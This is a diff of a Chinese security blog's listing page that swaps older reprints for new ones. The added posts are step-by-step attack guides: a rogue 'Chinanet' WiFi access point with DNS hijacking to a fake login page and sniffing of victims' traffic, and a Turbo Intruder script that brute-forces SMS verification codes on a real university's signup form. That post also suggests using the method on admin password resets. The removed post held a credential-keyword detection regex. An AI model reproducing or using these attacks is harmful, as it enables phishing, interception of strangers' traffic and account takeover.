@@ -86,32 +86,97 @@
 
     
         <h2 class="title">
-            <a href="/2023/09/02/Fiddler-HTTPS/">
-                Fiddler设置解密https的网络数据
+            <a href="/2023/12/06/Fishing-WiFi/">
+                kali搭建钓鱼WiFi
             </a>
         </h2>
     
     <time>
-        Sep 2, 2023
+        Dec 6, 2023
     </time>
     <section class="content">
-        <h1><span id="fiddler设置解密https的网络数据">Fiddler设置解密https的网络数据</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38914978/article/details/104801629">Admirer_joker</a> 并作补充</p>
+        <h1><span id="kali搭建钓鱼wifi">kali搭建钓鱼WiFi</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.bbskali.cn/2179.html">逍遥子</a> 并作补充</p>
+<p>如何在kali下快速搭建钓鱼WiFi呢？全网最简单最详细的教程核能来袭。一起来看看吧。</p>
 </blockquote>
-<h2><span id="原理">原理</span></h2><blockquote>
-<p>Fiddler可以通过伪造CA证书来欺骗了浏览器和https服务器。大致原理就是在浏览器面前fiddler伪装成为一个https服务器，而在真正的https服务器面前fiddler又伪装成为浏览器，从而实现解密https数据包的目的；</p>
+<h2><span id="准备">准备</span></h2><blockquote>
+<ul>
+<li>USB无线网卡（推荐8187 3070）</li>
+<li>hostapd dnsmasq apache2</li>
+<li>kali2020(最新版)</li>
+</ul>
 </blockquote>
-<h2><span id="步骤">步骤</span></h2><blockquote>
-<p>解密https需要手动开启，步骤如下：</p>
+<h3><span id="配置无线网卡">配置无线网卡</span></h3><blockquote>
+<p>在终端执行 <code>ifconfig</code>查看是否有 <code>wlan0</code>如果存在，我们需要激活为监听模式。执行命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airmon-ng start wlan0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/1.png" alt="image" title="开启网卡监听模式"></p>
 </blockquote>
-<h3><span id="1-tools-gt-fiddler-options-gt-https">1. Tools –&gt; Fiddler Options –&gt; HTTPS</span></h3><h3><span id="2-打开options-https后如图">2. 打开options-https后，如图：</span></h3><blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/1.png" alt="image"></p>
+<h3><span id="配置hostapd">配置hostapd</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim hostapd.conf</span><br></pre></td></tr></table></figure>
+
+<p>写入下面内容</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0mon</span><br><span class="line">driver=nl80211</span><br><span class="line">ssid=Chinanet <span class="comment">#无线名称 随意即可</span></span><br><span class="line">hw_mode=g</span><br><span class="line">channel=6</span><br><span class="line">macaddr_acl=0</span><br><span class="line">ignore_broadcast_ssid=0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/2.png" alt="image"></p>
 </blockquote>
-<blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/2.png" alt="image"></p>
+<h3><span id="配置dnsmasq文件">配置dnsmasq文件</span></h3><blockquote>
+<p>终端执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim dnsmasq.conf</span><br></pre></td></tr></table></figure>
+
+<p>写入内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan0mon</span><br><span class="line">dhcp-range=192.168.1.2, 192.168.1.30, 255.255.255.0, 12h</span><br><span class="line">dhcp-option=3, 192.168.1.1</span><br><span class="line">dhcp-option=6, 192.168.1.1</span><br><span class="line">server=8.8.8.8</span><br><span class="line">log-queries</span><br><span class="line">log-dhcp</span><br><span class="line">listen-address=127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/3.png" alt="image"></p>
 </blockquote>
-<blockquote>
-<p><img src="/2023/09/02/Fiddler-HTTPS/3.png" alt="image"></p>
+<h3><span id="配置防火墙和端口转发">配置防火墙和端口转发</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE</span><br><span class="line">iptables --append FORWARD --in-interface wlan0mon -j ACCEPT</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/4.png" alt="image"></p>
+<p>这样做的目的是保证我们的鱼儿能够正常上网。</p>
+</blockquote>
+<h3><span id="给无线网卡分配ip地址">给无线网卡分配IP地址</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig wlan0mon up 192.168.1.1 netmask 255.255.255.0</span><br><span class="line">route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="启动钓鱼热点">启动钓鱼热点</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hostapd hostapd.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/Fishing-WiFi/5.png" alt="image"></p>
+<p>这样我们便可以看到有一个 <code>china-net</code>的热点，但是不能连接，不要着急，我们启动dnsmasq即可。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsmasq -C dnsmasq.conf -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这样，我们的热点便可以正常连接并上网了。</p>
+<p><img src="/2023/12/06/Fishing-WiFi/6.png" alt="image"></p>
+<p>左边为连接的设备，右边有设备访问的网站信息。</p>
+</blockquote>
+<h2><span id="高级操作">高级操作</span></h2><h3><span id="嗅探目标图片">嗅探目标图片</span></h3><blockquote>
+<p>在终端执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">driftnet -i wlan0mon</span><br></pre></td></tr></table></figure>
+
+
+
+<p>便可以看到目标访问的站点图片信息。</p>
+<p><img src="/2023/12/06/Fishing-WiFi/7.png" alt="image"></p>
+</blockquote>
+<h3><span id="中间人攻击">中间人攻击</span></h3><h4><span id="域名重定向">域名重定向</span></h4><blockquote>
+<p>修改 <code>/etc/ettercap/etter.dns</code>文件，添加内容如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">baidu.com      A   192.168.1.1</span><br><span class="line">*.baidu.com    A   192.168.1.1</span><br><span class="line">www.baidu.com  PTR 192.168.1.1</span><br></pre></td></tr></table></figure>
+
+
+
+<p>即，当我们访问百度，自动跳转到本地。<br>开启本地 <code>apache</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
+
+
+
+<p>将做好的钓鱼页面放到 <code>/var/www/html</code>目录下，然后终端执行 <code>ettercap -G</code>利用 <code>ettercap</code>进行DNS劫持，具体做法这里不再诉述。</p>
+<p><img src="/2023/12/06/Fishing-WiFi/8.png" alt="image" title="仿电信钓鱼页面"></p>
+<p>当然，你也可以对目标进行数据包的捕获和分析，我们这里也不再说了。</p>
+</blockquote>
+<h3><span id="填个坑">填个坑</span></h3><blockquote>
+<p>有不少人搭建完成后，反应上不了网，是因为dns冲突了。如你家的路由器的网段是<code>192.168.1.1/24</code>而在dns的配置文件中<code>dhcp-option=3, 192.168.1.1</code>这样会冲突，解决办法很简单，把<code>192.168.1.1</code>改成其他网段就行了，如<code>192.168.5.1</code>，但是后面的规则也要改。最简单的方法就是登陆路由器，将<code>lan</code>口地址<code>192.168.1.1</code>改掉就行了！</p>
 </blockquote>
 
 
@@ -119,7 +184,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Fiddler/" rel="tag">Fiddler</a><a class="tag-none-link" href="/tags/HTTPS/" rel="tag">HTTPS</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Fishing/" rel="tag">Fishing</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
             </div>
         
 
@@ -130,115 +195,71 @@
 
     
         <h2 class="title">
-            <a href="/2023/07/24/Hard-Coding/">
-                敏捷代码审计之代码硬编码
+            <a href="/2023/12/06/Burpsuite-Turbo-Intruder/">
+                记一次使用Burpsuite下的插件Turbo intruder进行实战
             </a>
         </h2>
     
     <time>
-        Jul 24, 2023
+        Dec 6, 2023
     </time>
     <section class="content">
-        <h1><span id="敏捷代码审计之代码硬编码">敏捷代码审计之代码硬编码</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://hksanduo.github.io/2022/09/09/2022-09-09-harder-coding-scan/">Sanduo</a> 并作补充</p>
-</blockquote>
-<h2><span id="介绍">介绍</span></h2><blockquote>
-<p>硬编码（英语：Hard Code或Hard Coding）是指在软件编码过程中，将输出或输入的相关参数（例如：路径、输出的形式或格式）直接以常量的方式撰写在源代码中，而非在执行期间由外界指定的设置、资源、资料或格式做出适当回应。一般被认定是种反模式或不完美的实现，因为软件受到输入资料或输出格式的改变就必须修改源代码，对客户而言，改变源代码之外的小设置也许还比较容易。但硬编码的状况也并非完全只有缺陷，因某些封装需要或软件本身的保护措施，有时是必要的手段。除此之外，有时候因应某些特殊的需求，制作出简单的应用程序，应用程序可能只会执行一次或者有限的几次，或者永远只应付某种单一需求。<br>所谓硬编码，就是把一个本来应该（可以）写到配置信息中的信息直接在程序代码中写死了。密钥硬编码在代码中，而根据密钥的用途不同，这导致了不同的安全风险，有的导致加密数据被破解，数据不再保密，有的导致和服务器通信的加签被破解，引发各种血案。</p>
-</blockquote>
-<h2><span id="硬编码检测方法">硬编码检测方法</span></h2><blockquote>
-<p>方法论主要参考：密码密钥硬编码检查，参考链接详见文章末尾。</p>
-</blockquote>
-<h3><span id="鉴别密码密钥方法">鉴别密码密钥方法</span></h3><h4><span id="香农熵shannon-entropy">香农熵(Shannon entropy)</span></h4><blockquote>
-<p>密钥的长度决定了密钥空间(keyspace），通常以位为单位。密钥空间越大，密钥被攻破的难度就越大。<br>密钥是由密钥空间的随机值构成。对于任意一个随机变量 X，它的熵定义如下：</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Hard-Coding/1.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>变量的不确定性越大，熵也就越大，把它搞清楚所需要的信息量也就越大。</p>
-<ul>
-<li>P(x_i)P(xi) : 指的是单个样本变量所属的变量种类的个数占据所有变量个数的比例。同等长度的字符串，通常密钥的熵值更高</li>
-<li>密钥为避免彩虹攻击，在取值上更加的离散，会尽量采用不重复的字符。就像我们为了增加密码的复杂性，要求长度不小于8，必须包含大小写、特殊字符、以及数字一样的道理。所以密钥的熵值会比一般的文本要高的多。我们就是利用这点来识别字符串是否是密钥。</li>
-</ul>
-</blockquote>
-<h3><span id="工具的检查逻辑">工具的检查逻辑</span></h3><blockquote>
-<p>对于密码密钥的硬编码检查可以采用静态分析工具来完成。工具的检查过程通常包含四个过程：输入文件准备、检查、过滤和报告输出。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Hard-Coding/2.png" alt="image"></p>
-</blockquote>
-<h4><span id="输入文件分类">输入文件分类</span></h4><blockquote>
-<p>我们需要检查的文本文件进行分类，通常包括以下几种类型：</p>
-<ul>
-<li>程序语言：C、C++、Java、Python、Go、Js等；</li>
-<li>有统一格式的文件：属性文件、yaml、csv、json、xml等；</li>
-<li>文本文件：没有固定格式的文本文件。<br>分类的目的是为了更好的识别文件中的字符串常量，充分利用字符串常量的上下文关联，以便在分析中最大程度的减少误报。</li>
-</ul>
-</blockquote>
-<h4><span id="输入文件转换">输入文件转换</span></h4><blockquote>
-<ul>
-<li>程序语言：通过各语言的语法解析器，解析成抽象语法树，提取语法树中的等于字符串的常量，以及对应的变量名；</li>
-<li>有统一格式的文件：照格式转换成变量名和字符串常量值；</li>
-<li>文本文件：采用token的方式分割成一个个的token，变成一个各的字符串常量。</li>
-</ul>
-</blockquote>
-<h4><span id="密码密钥检查">密码密钥检查</span></h4><blockquote>
-<p>在我们得到大量的变量名和字符串常量后，主要通过正则表达式匹配的方式完成目标的筛选。我们收集的密钥格式包括国内国外主流平台、SDK等相关系统的密钥配置参数名称，可以根据客户的实际情况手动增加和优化规则，进而提高检测的速度和效率。<br>由于检查密码密钥的种类和类型不同，可以通过配置文件来提高检查能力的可扩展性。<br>检查配置选项主要包括以下内容：</p>
-</blockquote>
-<p>|信息	|描述	|<br>|检查类型	|可分为：变量名、字符串常量、或两个都检查	|<br>|密码密钥的类型	|用于区分不同类型的密码密钥；同时用于告警时区分具体检测到的密码密钥类型	|<br>|正则表达式	|主要设定匹配的长度，每个字符的可选类型	|<br>|熵值的阈值	|用于精确的识别密码密钥的类型，降低误报	|</p>
-<blockquote>
-<p>例如：<br>检查硬编码的口令：检查变量名中包含：password、passwd、pwd的变量，且变量等于字符串常量；正则表达式可以设置成为：”.*(password|passwd|pwd)$”。<br>检查GitHub的个人凭证：检查字符串常量；这个凭证是以”ghp_”开头的，跟随长度为36的字符串，且每个字符可以为数字和字母；正则表达式可以设置成为：“ghp_[0-9a-zA-Z]{36}”。</p>
-</blockquote>
-<h4><span id="密码密钥过滤">密码密钥过滤</span></h4><blockquote>
-<p>静态分析能很大程度上减少了人工审核的工作量，但由于检查模式的不确定性，也会带来不少的误报。误报会给用户在审核过程中带来很大的负面情绪，从而不愿继续使用工具。为了进一步降低误报，我们可以通过下面的方式来降低误报：</p>
-<ul>
-<li>密码密钥熵值的计算<br>前面讨论过密码密钥的特点，可以通过检测密码密钥的信息熵的方式来降低误报。有些密码密钥设定了最低的阈值，但还是有很多密码密钥并未给出具体的阈值，这个就需要通过经验积累来设定，目前业界也有通过机器学习来完善这个阈值的设定。</li>
-<li>污点分析<br>在代码中，对于口令的变量的取名上，很多并不会遵守可读性和可维护性来设定变量名，通过前面正则表达式的方式来查找硬编码密码的方式，会造成很多的漏报。这里还可以通过污点分析的方法，来推导出密码是否采用了硬编码。例如检查jdbc连接的密码参数，查看该参数是否为字符串常量。</li>
-</ul>
-</blockquote>
-<h4><span id="报告输出">报告输出</span></h4><blockquote>
-<p>将经过过滤后的结果，输出告警，给出可能泄露的文件名和变量或可能为密码密钥的常量字符串位置，便于人工的排查。</p>
-</blockquote>
-<h2><span id="硬编码检测实战">硬编码检测实战</span></h2><blockquote>
-<p>对于审计人员或者安全管理人员并不需要关注密钥检查的算法，通常只需要选用合适的流程，匹配恰当的工具，迅速准确的定位硬编码即可。</p>
-</blockquote>
-<h3><span id="检查的流程">检查的流程</span></h3><blockquote>
-<p>信息收集：此阶段中，审计人员进行必要的信息收集，包括本次审计要求、稳定版本的源代码。<br>工具审计：确定工具审计的标准和各项配置参数，使用Fortify、gitleaks等工具检测目标源代码，对工具检测的结果进行人工核查，筛选，分析，汇总。<br>人工审计：对客户要求人工审计的重点代码采用人工分析的方法，对源代码中的硬编码进行审计。<br>综合汇总：将工具审计和人工审计的结果进行对比汇总<br>输出报告：此阶段中，审计人员根据测试的结果编写直观的硬编码审计服务报告。<br>源代码硬编码审计要求工作人员有丰富的经验及新颖的思路，同时也是一项比较耗费时间和资源的工作，从效率考虑，一般选择性的抽取部分重要环节的代码进行人工审计。</p>
-</blockquote>
-<h3><span id="开源检查工具">开源检查工具</span></h3><h4><span id="secretscanner">SecretScanner</span></h4><blockquote>
-<p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/deepfence/SecretScanner">https://github.com/deepfence/SecretScanner</a><br>SecretScanner可以扫描主机上的容器镜像或本地目录，主要通过正则匹配，扫描效率较高，不仅支持代码而且支持容器扫描，并将结果输出到JSON文件，其中会包含SecretScanner找到的所有敏感数据的详细信息。<br>SecretScanner方便安全人员在主机上收集敏感数据，如果需要审计特定类型代码或者增加新的硬编码检测点，需要手动修改规则，默认配置文件位于项目中的config.yaml，可以根据实际情况自行修改。</p>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Hard-Coding/3.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>不足：规则数量一般</p>
-</blockquote>
-<h4><span id="gitleaks">gitleaks</span></h4><blockquote>
-<p>Gitleaks为你提供了一种方法来扫描你的git存储库，以查找这些不需要的数据，这些数据应该是私有的，扫描可以自动化，以完全适合CI&#x2F;CD工作流程，以便在密码识别更深入到代码库之前进行识别。<br>gitleaks比较有趣的有以下几点：</p>
-<ul>
-<li>支持私有存储库扫描以及需要基于密钥的身份验证的存储库。</li>
-<li>支持Gitlab批量组织和存储库所有者（用户）存储库扫描，并提取请求扫描以在常见CI工作流中使用。</li>
-<li>支持Pre-Commit，方便研发人员在提交之前进行硬编码检测，防止敏感信息提交。</li>
-<li>支持使用git log命令验证由gitleaks找到的发现</li>
-</ul>
-</blockquote>
-<blockquote>
-<p><img src="/2023/07/24/Hard-Coding/4.png" alt="image"></p>
-</blockquote>
-<blockquote>
-<p>不足：对普通用户友好程度一般，对于pre-commit需要手动配置，并且在大文件扫描效率较低，官方已移除多线程配置参数，使用默认线程数进行扫描，如果在使用过程中感觉缓慢，可自行设定编译。同样规则数量一般，可以根据实际情况添加。</p>
-</blockquote>
-<h4><span id="sasts">SASTs</span></h4><blockquote>
-<p>各种SAST工具都可以检测硬编码，但是受限于使用场景，只能检测较少的硬编码场景，比如password，key等，对于特定的硬编码需要手动增加规则，规则友好性一般。</p>
-</blockquote>
-<h3><span id="硬编码检测规则">硬编码检测规则</span></h3><blockquote>
-<p>无论gitleaks还是secretScanner，均使用正则匹配相关硬编码，敏感信息，我这里整理出部分敏感信息参数，供大家参考，至于规则，按照要求，自行补充即可，比较简单，这里就不单独描述了</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regex: <span class="string">&#x27;(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]&#123;0,25&#125;)(=|&gt;|:=|\|\|:|&lt;=|=&gt;|:).&#123;0,5&#125;[\&quot;]([0-9a-zA-Z\-_=]&#123;8,64&#125;)[\&quot;]&#x27;</span> </span><br></pre></td></tr></table></figure>
+        <h1><span id="记一次使用burpsuite下的插件turbo-intruder进行实战">记一次使用Burpsuite下的插件Turbo intruder进行实战</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/243953.html">酷酷的繁星</a> 并作补充</p>
+<p>相信很多师傅在进行渗透测试或者漏洞挖掘的时候都会用到burpsuite这款神器，但是不知道师傅们用过burpsuite里面一款叫turbo intruder的插件么</p>
+<p>不管这些，今天看了这篇文章的师傅我相信也会对这款插件有兴趣</p>
+<p>安装教程等等的文章在各大论坛一找一大堆，但是实战的又有几个呢，对吧？</p>
+<p>今天繁星就给大家带来turbo intruder实战教程</p>
+<p>目标站点是某科技大学的站点</p>
+<p>首先我们打开这个站点的首页看看</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/1.png" alt="image"></p>
+<p>可以看到有注册按钮</p>
+<p>我们点进去看看</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/2.png" alt="image"></p>
+<p>然后在这里推荐师傅们一个很便利的短信接收平台</p>
+<p><a target="_blank" rel="noopener" href="https://www.bfkdim.com/">https://www.bfkdim.com/</a></p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/3.png" alt="image"></p>
+<p>好的，继续</p>
+<p>手机号那里我们就填这个平台里面的一个手机号</p>
+<p>开启我们的burpsuite，点“立即注册”抓个包</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/4.png" alt="image"></p>
+<p>选择验证码右键</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/5.png" alt="image"></p>
+<p>发送到turbo intruder</p>
+<p>我们这边不同官方的代码</p>
+<p>爆破验证码只需生成数字的所有排列组合就可以了，可以通过以下代码来生成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">def brute_veify_code(target, engine, length):</span><br><span class="line">   pattern = &#x27;1234567890&#x27;</span><br><span class="line">   for i in list(product(pattern, repeat=length)):</span><br><span class="line">        code =  &#x27;&#x27;.join(i)</span><br><span class="line">        engine.queue(target.req, code)</span><br><span class="line"></span><br><span class="line">def queueRequests(target, wordlists):</span><br><span class="line">   engine = RequestEngine(endpoint=target.endpoint,</span><br><span class="line">           concurrentConnections=30,</span><br><span class="line">           requestsPerConnection=100,</span><br><span class="line">           pipeline=True</span><br><span class="line">           )</span><br><span class="line">   brute_veify_code(target, engine, 6)</span><br><span class="line"></span><br><span class="line">def handleResponse(req, interesting):</span><br><span class="line"># currently available attributes are req.status, req.wordcount, req.length and req.response</span><br><span class="line"> if &#x27;error&#x27; not in req.response:</span><br><span class="line">      table.add(req)</span><br></pre></td></tr></table></figure>
 
-<h2><span id="参考">参考</span></h2><blockquote>
-<p><a target="_blank" rel="noopener" href="https://developer.huawei.com/consumer/cn/forum/topic/0204931065040020698?fid=0101592429757310384">密码密钥硬编码检查</a><br><a target="_blank" rel="noopener" href="https://github.com/deepfence/SecretScanner">SecretScanner</a><br><a target="_blank" rel="noopener" href="https://github.com/zricethezav/gitleaks">gitleaks</a><br><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Android%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8B%E6%B5%85%E8%B0%88%E5%AF%86%E9%92%A5%E7%A1%AC%E7%BC%96%E7%A0%81.html">浅谈密钥硬编码</a></p>
+
+
+<p>复制这段代码替换掉默认的</p>
+<p>然后点击最下方攻击</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/6.png" alt="image"></p>
+<p>我们可以看到各种数据，这速度反正我是爱了，师傅们还没爱吗</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/7.png" alt="image"></p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/8.png" alt="image"></p>
+<p>我们可以看到响应包，没有什么限制，所以我们可以继续进行枚举</p>
+<p>PS：拿turbo intruder枚举有时候会崩，不用慌，关掉再来一遍就行了</p>
+<p>由于本人电脑配置太水加上网络慢，所以还没枚举完验证码就过期了，跟我一样的师傅可以尝试多几次</p>
+<p>经过两个小时的奋战后，终于…….</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/9.png" alt="image"></p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/10.png" alt="image"></p>
+<p>被ban了</p>
+<p><img src="/11.png" alt="image"></p>
+<p>没有办法只能换个手机号继续搞</p>
+<p>重复做了一遍之后</p>
+<p>当我再点击获取验证码，提示该手机号已经注册，这意味着什么？意味着刚刚的枚举成功了，我们回到turbo intruder找下响应包</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/12.png" alt="image"></p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/13.png" alt="image"></p>
+<p>响应包的字节是55，与其它的包不一样所以就是这个了</p>
+<p>可以看到响应包，提示success</p>
+<p>再看看其它的响应包</p>
+<p>这个字节76的是验证码错误</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/14.png" alt="image"></p>
+<p>字节88的是该手机已被注册</p>
+<p><img src="/2023/12/06/Burpsuite-Turbo-Intruder/15.png" alt="image"></p>
+<p>我们会发现前面的全是字节76后面的全88那我们要在76和88的交界部分找成功的包</p>
+<p>另外，再声明一下，这篇文章是介绍turbo intruder的实战，重点在turbo intruder，有的师傅可能会觉得注册处爆破验证码并没什么用，但是大家想想，注册处爆破验证码的原理和找回密码处爆破验证码的原理有什么区别？再大胆点想象一下，要是管理员登录处有找回密码这一功能呢？对吧？</p>
 </blockquote>
 
 
@@ -246,7 +267,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/Burpsuite/" rel="tag">Burpsuite</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
             </div>
         
 
@@ -257,573 +278,226 @@
 
     
         <h2 class="title">
-            <a href="/2023/07/24/Python-Telnet/">
-                Python telnet模块说明
+            <a href="/2023/12/06/ARP-SSLStrip/">
+                如何进行一次完整的 SSLStrip 攻击
             </a>
         </h2>
     
     <time>
-        Jul 24, 2023
+        Dec 6, 2023
     </time>
     <section class="content">
-        <h1><span id="python-telnet模块说明">Python telnet模块说明</span></h1><blockquote>
-<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41629756/article/details/102784236">三番鱼</a> 并作补充</p>
-</blockquote>
-<h2><span id="程序要点说明">程序要点说明</span></h2><blockquote>
-<p>python实现telnet客户端的六个关键问题及其答案是：<br>使用什么库实现telnet客户端—-telnetlib</p>
-</blockquote>
-<blockquote>
-<p>1.怎么连接主机—-两种方法，一种是在实例化时传入ip地址连接主机（tn &#x3D; telnetlib.Telnet(host_ip,port&#x3D;23)），第二种是，先不传参数进行实例化再用open方法连接主机（我这里使用的方法）</p>
-</blockquote>
-<blockquote>
-<p>2.怎么输入用户名密码—-我们使用read_untilb函数监听，出现标志后使用write方法向服务端传输用户名密码</p>
-</blockquote>
-<blockquote>
-<p>3.怎么执行命令—-仍然是使用write方法向服务端传送命令，不管向服务端传送什么数据都用write；不过要注意需要编码成bytes类型<br>注：该Telnet.write()函数采用字节字符串。这可以通过仅编码字符串（您尝试编码函数的返回值）来提供，例如：</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.write(<span class="string">&quot;administrator\n&quot;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>或者通过为字符串添加前缀b如下：</p>
-</blockquote>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"> </span><br><span class="line">host = <span class="string">&quot;192.168.1.0&quot;</span></span><br><span class="line">port = <span class="number">23</span></span><br><span class="line">timeout = <span class="number">100</span></span><br><span class="line"> </span><br><span 